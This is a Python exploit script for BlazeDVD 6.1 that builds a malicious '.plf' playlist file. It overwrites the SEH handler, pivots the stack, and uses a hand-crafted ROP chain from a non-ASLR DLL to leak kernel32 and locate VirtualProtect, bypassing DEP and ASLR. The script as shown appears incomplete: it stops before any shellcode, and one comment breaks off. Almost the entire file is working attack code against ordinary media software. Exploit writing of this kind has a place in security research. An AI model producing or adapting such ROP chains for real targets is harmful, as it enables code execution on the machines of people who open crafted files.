# BlazeDVD 6.1 '.plf' Memory Corruption Exploit (SEH, DEP, and ASLR Bypass)
# Author: Connor McGarr (@33y0re)
# ROP'd this bad boy by hand- sorry mona.
# In muts we trust.
import sys
import os
import struct

# 612 byte offset to SEH
crash = "\x41" * 612

# DEP is enabled- so no pop pop ret
# Only need SEH (not nSEH also) in this case
print "[+] Performing stack pivot..."
crash += struct.pack('<L', 0x6030ef6d)		# add esp, 0x92C, ret: Configuration.dll (non-ASLR module)

# Stack pivot lands here
crash += "\x90" * 684

# Stack leaks kernel32 pointer
print "[+] Sifting through the stack to locate leak to kernel32!LocalFreeStub..."
crash += struct.pack('<L', 0x6030671f) 		# mov eax, ebp, pop esi, pop ebp, pop ebx, ret 0x4: Configuration.dll (non-ASLR module)
crash += struct.pack('<L', 0x90909090)		# Padding to compensate for pop esi
crash += struct.pack('<L', 0x90909090)		# Padding to compensate for pop ebp
crash += struct.pack('<L', 0x90909090)		# Padding to compensate for pop ebx

# EAX now contains old EBP value. EBP has a static offset at crash time to an item on the stack which contains a pointer to kernel32!LocalFreeStub
# Obtaining address that leaks kernel32!LocalFreeStub by calculating offset
crash += struct.pack('<L', 0x60308afb)		# pop ecx, ret: Configuration.dll (non-ASLR module)
crash += struct.pack('<L', 0x90909090)		# Padding to compensate for ret 4 in previous ROP gadget
crash += struct.pack('<L', 0xfffff154)		# Offset to kernel32!LocalFreeStub (using 2's complmenet to avoid null bytes)
crash += struct.pack('<L', 0x60328ffa) 		# add eax, ecx, pop esi, ret: Configuration.dll (non-ASLR module)
crash += struct.pack('<L', 0x90909090)		# Padding to compensate for pop esi

# EAX now contains the address on the stack that points to kernel32!LocalFreeStub
# Need to extract the pointer
print "[+] Extracting pointer to kernel32!LocalFreeStub..."
crash += struct.pack('<L', 0x60327cdc) 		# mov eax, dword [eax], ret: Configuration.dll (non-ASLR module)

# Need to find base "
print "[+] Obtaining address of kernel32!VirtualProtect..."
crash += struct.pack('<L', 0x60308afb)          # pop ecx, ret: Configuration.dll (non-ASLR module)
crash += struct.pack('<L', 0xfffb529c)		# Offset to kernel32!VirtualProtect (using 2's complement to avoid null bytes)
crash += struct.pack('<L', 0x60328ffa)          # add eax, ecx, pop esi, ret: Configuration.dll (non-ASLR module)
crash += struct.pack('<L', 0x90909090)          # Padding to compensate for pop esi

f = open('bajablast.plf','w')
f.write(crash)
f.close()
